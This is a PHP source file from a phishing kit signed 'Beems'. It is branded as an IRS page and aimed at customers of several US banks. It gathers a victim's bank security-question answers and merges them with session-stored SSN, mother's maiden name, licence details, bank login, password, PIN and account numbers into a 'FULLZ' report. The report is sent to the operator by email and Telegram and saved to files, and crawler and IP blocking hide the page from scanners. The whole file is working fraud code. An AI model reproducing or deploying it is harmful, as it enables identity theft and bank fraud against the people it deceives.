<?php
session_start();
/*
* Scampage by Beems
* Jabber: beems@exploit.im
* ICQ: Beems
*/
require_once '../../main.php';

require_once '../../blocker.php';
if($block_referrer == "on") {
    require_once '../../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../../blacklist.php';
}
require_once '../session.php';

if (!$_POST['answer3']){
    } else {
        $question1 = $_POST['question1'];
        $answer1 = $_SESSION['answer1'] = $_POST['answer1'] ;
        $question2 = $_POST['question2'];
        $answer2 = $_SESSION['answer2'] = $_POST['answer2'] ;
        $question3 = $_POST['question3'];
        $answer3 = $_SESSION['answer3'] = $_POST['answer3'] ;

        $questionsCode1 = array(
            // PNC
            "Q1.7" => "What is the first name of your oldest nephew?",
            "Q1.16" => "What was the TV series you liked most as a child?",
            "Q1.12" => "In what city or country do you want to retire?",
            "Q1.19" => "What is the first and last name of your most memorable childhood babysitter/caregiver?",
            "Q1.18" => "What is your youngest cousin's first and last name?",
            "Q1.13" => "What was the first and last name of your first roommate during college?",
            "Q1.15" => "What is the first and last name of the person you went to your prom with?",
            "Q1.14" => "What is the last name of your least favorite teacher in high school?",
            "Q1.11" => "What was your favorite toy when you were a child?",
            "Q1.17" => "What is your maternal grandfather's profession?",
            // BOA
            "Q1.7b" => "What celebrity do you most resemble?",
            "Q1.16b" => "What is the last name of your third grade teacher?",
            "Q1.12b" => "What was the name of your first boyfriend or girlfriend?",
            "Q1.19b" => "What is the name of your favorite charity?",
            "Q1.18b" => "What is the name of your first babysitter?",
            "Q1.13b" => "What is your best friends first name?",
            "Q1.15b" => "In what city did you meet your spouse/significant other?",
            "Q1.14b" => "In what city did you honeymoon? (Enter full name of city only)",
            "Q1.11b" => "What is the last name of your family physician?",
            "Q1.17b" => "What street did your best friend in high school live on? (Enter full name of street only)",
            //Regions
            "Q1.17r" => "What was the name of your bestfriend?",
            "Q1.16r" => "What was the name of your bestfriend in high school?",
            "Q1.12r" => "What is the last name of your favorite teacher?",
            "Q1.19r" => "Where did you go on your first vacation?",
            "Q1.18r" => "What is the last name of the author of the best book you ever read?",
            "Q1.13r" => "Who is your favourite author?",
            "Q1.15r" => "What is your dream job?",
            "Q1.14r" => "What is your favorite book?",
            "Q1.11r" => "Who was your first crush?",
            "Q1.17r" => "What is your best friends middle name?",
            "Q1.20r" => "What was the name of your first teacher?",
            "Q1.21r" => "What school did you attend when you were 13?",
            //USAA
            "Q1.7u" => "First name of maternal grandfather?",
            "Q1.16u" => "City your mother was born in?",
            "Q1.19u" => "Name of your first employer?",
            "Q1.18u" => "City you got married in?",
            "Q1.13u" => "First name of your best man?",
            "Q1.15u" => "First name of first boyfriend?",
            // BB&T
            "Q1.1bb" => "Who was your high school prom date?",
            "Q1.2bb" => "Who's the tallest person in your family?",
            "Q1.3bb" => "What was the name of your first roommate in college?",
            "Q1.4bb" => "What was the most memorable concert you've attended?",
            "Q1.5bb" => "What's your favorite book?",
            "Q1.6bb" => "Where did you get engaged?",
            "Q1.7bb" => "Who's your favorite author?",
            "Q1.8bb" => "What was the first name of your first manager?",
            "Q1.9bb" => "What was your dream job?",
            "Q1.10bb" => "What was the last name of your favorite mentor or teacher?",
            "Q1.11bb" => "What was the first musical instrument you learned to play?",
            "Q1.12bb" => "What was the name of your most memorable stuffed animal?",
            // HUNTINGTON
            "Q1.1hun" => "What was the make and model of the first car you owned?",
            "Q1.2hun" => "What is your favorite hobby?",
            "Q1.3hun" => "What is your father's middle name?",
            "Q1.4hun" => "What is the name of your favorite city?",
            "Q1.5hun" => "What is your mother's maiden name?",
            "Q1.6hun" => "What is the last name of your favorite author?",
            "Q1.7hun" => "What is your brother or sister's middle name?",
            "Q1.8hun" => "What is your favorite game or sport?",
            "Q1.9hun" => "What is your grandmother's maiden name?",
            "Q1.10hun" => "What is the name of your favorite restaurant?",
            //US BANK
            "Q1.1usb" => "What are the last five digits of your student id?",
            "Q1.2usb" => "Who was your childhood hero?",
            "Q1.3usb" => "What is the name of your first pet?",
            "Q1.4usb" => "What was your favorite movie as a child?",
            "Q1.5usb" => "What famous landmark would you most like to visit?",
            "Q1.6usb" => "In what city was your first job?",
            "Q1.7usb" => "Where did you go on your most memorable vacation?",
            "Q1.8usb" => "What was the name of your best friend in high-school?",
            "Q1.9usb" => "What was your favorite teachers name?",
            "Q1.10usb" => "Who was your father's first employer?"
        );

        $questionsCode2 = array(
            // PNC
            "Q2.13" => "What were your wedding colors?",
            "Q2.11" => "What was your favorite Halloween costume in elementary school?",
            "Q2.15" => "What is the name of a college you applied to but didn't attend?",
            "Q2.5" => "What was the name of your first girlfriend/boyfriend?",
            "Q2.16" => "On what street was the first address you lived in outside your parents' home?",
            "Q2.6" => "What was the name of your first pet?",
            "Q2.14" => "What famous person would you have liked to meet?",
            "Q2.3" => "What was the first name of your first manager?",
            "Q2.12" => "What was the last name of your fourth grade teacher?",
            "Q2.7" => "What is the first name of your oldest niece?",
            // BOA
            "Q2.11b" => "As a child,
            what did you want to be when you grew up?",
            "Q2.15b" => "What is the name of your favorite restaurant?",
            "Q2.5b" => "What is the first name of your high school prom date?",
            "Q2.16b" => "Who is your favorite person in history?",
            "Q2.6b" => "What is the name of your high school star athlete?",
            "Q2.14b" => ">Where were you on New Year 2000?",
            "Q2.3b" => "What was the make and model of your first car?",
            "Q2.12b" => "What was the first name of your first manager?",
            "Q2.7b" => "What is the first name of the best man/maid of honor at your wedding?",
            "Q2.13b" => "What was the first live concert you attended?",
            //Regions
            "Q2.13r" => "What was your first pet's name?",
            "Q2.11r" => "What was your paternal grandfather's first name?",
            "Q2.15r" => "What was your maternal grandfather's first name?",
            "Q2.5r" => "What was your paternal grandmother's first name?",
            "Q2.16r" => "What was your maternal grandmother's first name?",
            "Q2.6r" => "What is the last name of the maid of honor at your wedding?",
            "Q2.14r" => "What is the last name of the best man at your wedding?",
            "Q2.3r" => "What position did you play in your favorite sport?",
            "Q2.12r" => "What is the first name of the boy or girl that you first kissed?",
            "Q2.7r" => "What was the last name of your third grade teacher?",
            "Q2.20r" => "Address of your first house or child hood home(Street name)?",
            "Q2.21r" => "Where were you when you first heard about 9/11?",
            //USAA
            "Q2.13u" => "First name of paternal grandfather?",
            "Q2.11u" => "First name of first girlfriend?",
            "Q2.15u" => "Your age at your wedding?",
            "Q2.5u" => "Name of street you grew up on?",
            "Q2.16u" => "Name of first elementary school?",
            "Q2.6u" => "First name of your maid of honor?",
            // BB&T
            "Q2.1bb" => "What was the name of your favorite pet?",
            "Q2.2bb" => "What city was your first elementary school in?",
            "Q2.3bb" => "Where did you meet your spouse?",
            "Q2.4bb" => "What city did you meet your spouse in?",
            "Q2.5bb" => "Who was the best man/maid of honor at your wedding?",
            "Q2.6bb" => "Who was your first boyfriend/girlfriend?",
            "Q2.7bb" => "What was the first live concert you attended?",
            "Q2.8bb" => "What was the last name of your third grade teacher?",
            "Q2.9bb" => "What's your best friend's middle name?",
            "Q2.10bb" => "If you won the lottery, what would your first purchase be?",
            "Q2.11bb" => "Who's your favorite person in history?",
            "Q2.12bb" => "When you were a child, what did you want to be when you grew up?",
            // HUNTINTON
            "Q2.1hun" => "What was your first job?",
            "Q2.2hun" => "What was the name of your elementary school?",
            "Q2.3hun" => "What is the name of the street that you grew up on?",
            "Q2.4hun" => "What is your favorite place to visit?",
            "Q2.5hun" => "What sports team do you love to see lose?",
            "Q2.6hun" => "What is your greatest fear?",
            "Q2.7hun" => "Who is your favorite historical figure?",
            "Q2.8hun" => "What is the name of your favorite pet?",
            "Q2.9hun" => "Who is your favorite musician or band?",
            "Q2.10hun" => "What is the last name of your favorite teacher?",
            // US BANK
            "Q2.1usb" => "What was the street number of the house in which you grew up?",
            "Q2.2usb" => "What was the name of the maid of honor at your wedding?",
            "Q2.3usb" => "What was your favorite game as a child?",
            "Q2.4usb" => "What was the first concert you attended?",
            "Q2.5usb" => "What was the name of your best friend in college?",
            "Q2.6usb" => "Who would you most like to meet?",
            "Q2.7usb" => "What was the model of your first car?",
            "Q2.8usb" => "What was the name of your first employer?",
            "Q2.9usb" => "What was your favorite book as a child?",
            "Q2.10usb" => "What was the favorite car you owned?"
        );

        $questionsCode3 = array(
            //Regions
            "Q3.12" => "Where were you when you had your first kiss?",
            "Q3.14" => "What was your favorite place to visit as a child?",
            "Q3.11" => "What was your favorite movie as a child?",
            "Q3.17" => "What is your oldest sibling's nickname?",
            "Q3.10" => "What street did your best friend in high school live on? (Enter full name of street only)",
            "Q3.8" => ">What was the last name of your favorite teacher in your final year of high school?",
            "Q3.5" => "What was your favorite restaurant in college?",
            "Q3.13" => "What is your oldest cousin's first and last name?",
            "Q3.15" => "What is the name of the band you liked most during high school?",
            "Q3.16" => "What was your favorite book as a child?",
            //BOA
            "Q3.14b" => "What is your all-time favorite song?",
            "Q3.11b" => "What is the name of a college you applied to but didnt attend?",
            "Q3.17b" => "What is the name of the medical professional who delivered your first child?",
            "Q3.10b" => "What is the first name of your favorite niece/nephew?",
            "Q3.8b" => "What is the name of your best childhood friend?",
            "Q3.5b" => "What was the first name of your favorite teacher or professor?",
            "Q3.13b" => "What is the first name of your hairdresser/barber?",
            "Q3.15b" => "What is the first name of your mothers closest friend?",
            "Q3.16b" => "On what street is your grocery store?",
            "Q3.12b" => "What was the name of your first pet?",
            //Regions
            "Q3.12r" => "In what city did you meet your spouse/significant other?",
            "Q3.14r" => "What is the name of a college you applied to but didn't attend?",
            "Q3.11r" => "What was your first boss's last name?",
            "Q3.17r" => "Where were you when you had your first kiss?",
            "Q3.10r" => "What city did you live in in the year 2000?",
            "Q3.8r" => "What was your chilhood nickname?",
            "Q3.5r" => "What is the name of the place your wedding reception was held?",
            "Q3.13r" => "In what city did your mother and father meet?",
            "Q3.15r" => "Name of your oldest nephew?",
            "Q3.16r" => "Name of your oldest niece?",
            "Q3.20r" => "First name of you eldest maternal aunt?",
            "Q3.21r" => "What was your maternal grandmother's maiden name?",
            //USAA
            "Q3.12u" => "City you met your spouse in?",
            "Q3.14u" => "First name of first roommate in college?",
            "Q3.11u" => "City your father was born in?",
            "Q3.17u" => "First name of maternal grandmother?",
            "Q3.10u" => "City you got engaged in?",
            "Q3.8u" => "City of first elementary school?",
            // BB&T
            "Q3.1bb" => "What was your favorite place to visit as a child?",
            "Q3.2bb" => "Who was your favorite childhood friend?",
            "Q3.3bb" => "What's your biggest pet peeve?",
            "Q3.4bb" => "What was the name of your first pet?",
            "Q3.5bb" => "Who was your least favorite boss?",
            "Q3.6bb" => "What was your childhood phone number?",
            "Q3.7bb" => "What's the nickname you gave your favorite grandparent?",
            "Q3.8bb" => "Where do you want to retire?",
            "Q3.9bb" => "What is your dream car?",
            "Q3.10bb" => "What was the make and model of your first car?",
            "Q3.11bb" => "What street did you grow up on?",
            "Q3.12bb" => "Who was your first employer?",
            // HUNTINTON
            "Q3.1hun" => "Where were you born?",
            "Q3.2hun" => "Who is your favorite sports hero?",
            "Q3.3hun" => "Who is your favorite comic book or cartoon character?",
            "Q3.4hun" => "What is your favorite musical instrument?",
            "Q3.5hun" => "What is your mother's birthday mmddyyyy?",
            "Q3.6hun" => "What is your father's birthday mmddyyyy?",
            "Q3.7hun" => "Where is your ideal vacation spot?",
            "Q3.8hun" => "What is the first name of your best friend from childhood?",
            "Q3.9hun" => "What is your favorite fruit or vegetable?",
            //US BANK
            "Q3.1usb" => "In what city does your nearest sibling live?",
            "Q3.2usb" => "In what school did you attend the 6th grade?",
            "Q3.3usb" => "What is your greatest phobia or fear?",
            "Q3.4usb" => "What was the name of your first college roommate?",
            "Q3.5usb" => "What is the name of your hair stylist?",
            "Q3.6usb" => "What was the name of your favorite manager?",
            "Q3.7usb" => "What are the last five digits of your favorite frequent flyer card?",
            "Q3.8usb" => "What is the name of a college you applied to but did not attend?",
            "Q3.9usb" => "What is your dream car?",
            "Q3.10usb" => ">What was your childhood nickname?"
        );

            $VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
            $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
            $VictimInfo3 = "| UserAgent : " . $user_agent . "";
            $VictimInfo4 = "| Browser : " . $br . "";
          $VictimInfo5 = "| Os : " . $os . "";
          $questions1 = $_SESSION['question1'] = $questionsCode1[$question1];
          $questions2 = $_SESSION['question2'] = $questionsCode2[$question2];
          $questions3 = $_SESSION['question3'] = $questionsCode3[$question3];
          $userbank = $_SESSION['userbank'];
          $passwordbank = $_SESSION['passwordbank'];
          $loginretry = $_SESSION['loginretry'];
          $accountNumber = $_SESSION['accountNumberInput'];
          $routingNumber = $_SESSION['routingNumberGroup'];
          $accountType = $_SESSION['accountType'];
          $PaypalBank = $_SESSION['bankname'];    
          $pinbank = $_SESSION['pinbank'];  

          $LicenseNumber = $_SESSION['LicenseNumber'];
          $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'];
          $LicenseNumberHeight = $_SESSION['LicenseNumberHeight'];
          $LicenseNExp = $_SESSION['LicenseNExp'];
          $LicenseIss = $_SESSION['LicenseIss'];
          $MaidenName = $_SESSION['MaidenName'];
          $fullname = $_SESSION['fullname'];
          $DateOfBirth = $_SESSION['DateOfBirth'];
          $StreetAddress = $_SESSION['StreetAddress'];
          $StateRegion = $_SESSION['StateRegion'];
          $ZipCode = $_SESSION['ZipCode'];
          $CityR = $_SESSION['CityR'];
          $NumberPhone = $_SESSION['NumberPhone'];
          $NumberCarrier = $_SESSION['NumberCarrier'];
          $NumberPin = $_SESSION['NumberPin'];
          $SecurityNumber = $_SESSION['SecurityNumber'];
          $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
          $message .= "+ 💎 Personal Information\n";
          $message .= "| Full name : $fullname\n";
          $message .= "| Date of birth : $DateOfBirth\n";
          $message .= "| SSN : $SecurityNumber\n";
          $message .= "| MMN : $MaidenName\n";
          $message .= "| Address : $StreetAddress\n";
          $message .= "| State : $StateRegion\n";
          $message .= "| City : $CityR\n";
          $message .= "| Zip : $ZipCode\n";
          $message .= "| Telephone : $NumberPhone\n";
          if ($enablephonepin === "on") {
              $message .= "| Phone Carrier : $NumberCarrier\n";
              $message .= "| Phone Carrier Pin : $NumberPin\n";
          }
          $message .= "| License Number : $LicenseNumber\n";
          $message .= "| License Weight : $LicenseNumberWeight\n";
          $message .= "| License Height : $LicenseNumberHeight\n";
          $message .= "| License Issued State: $LicenseIss\n";
          $message .= "| License Expiry: $LicenseNExp\n";
          $message .= "+ ------------------------------------+\n";
          $message .="| 🏦 $PaypalBank Routing & Account Details\n";
          $message .="| Account Type : $accountType\n";
          $message .="| Routing Number : $routingNumber\n";
          $message .="| Account Number : $accountNumber\n";
          $message .= "+ ------------------------------------+\n";
          $message .="| 🏦 $PaypalBank Login Details $loginretry\n";
          $message .="| login : $userbank\n";
          $message .="| password : $passwordbank\n";
          if (isset($_SESSION['pinbank'])) {
              $message .="| Pin: $pinbank\n";
          }
          $message .="+ ------------------------------------+\n";
          $message .="| ❇️ $PaypalBank Security Questions & Answers \n";
          $message .="| question1 : $questions1\n";
          $message .="| answer1 : $answer1\n";
          $message .="| question2 : $questions2\n";
          $message .="| answer2 : $answer2\n";
          $message .="| question3 : $questions3\n";
          $message .="| answer3 : $answer3\n";
          $message .="+ ------------------------------------+\n";
          $message .= "+ 🌐 Victim Information\n";
          $message .= "$VictimInfo1\n";
          $message .= "$VictimInfo2\n";
          $message .= "$VictimInfo3\n";
          $message .= "$VictimInfo4\n";
          $message .= "$VictimInfo5\n";
          $message .= "| 🕛 Received : $date\n";
          $message .= "+ ------------------------------------+\n";
    $subject = $PaypalBank." + Security Question + FULLZ: ".$_POST['fullname']." [ $cn - $os - $ip ]";
    kirim_mail($email_result, $PaypalBank." + Security Question + FULLZ ".$fullname, $subject, $message);
    kirim_tele($telegram_bot_token, $telegram_chat_id);
    $dob_year = explode("/",$DateOfBirth);
    $dob_year = (end($dob_year));
    tulis_file("../../data/rezs/".$ip."_".$StateRegion."_".$dob_year.".txt", $message);
    if($save_file == "on") {
        tulis_file("../../data/Data_secq.txt", $message);
    }
    tulis_file("../../result/total_secq.txt", $ip);
}

?>